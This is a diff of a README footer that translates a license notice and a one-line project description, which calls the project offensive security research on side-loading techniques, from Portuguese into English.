-## Licença
+## License
 
-Distribuído sob a licença **MIT**. Veja [`LICENSE`](LICENSE) para o texto
-completo.
+Distributed under the **MIT** license. See [`LICENSE`](LICENSE) for the full text.
 
 <div align="center">
 
 ---
 
-Feito para pesquisa de segurança ofensiva e estudo de técnicas de side-loading.
+Created for offensive security research and the study of side-loading techniques.
 
 </div>
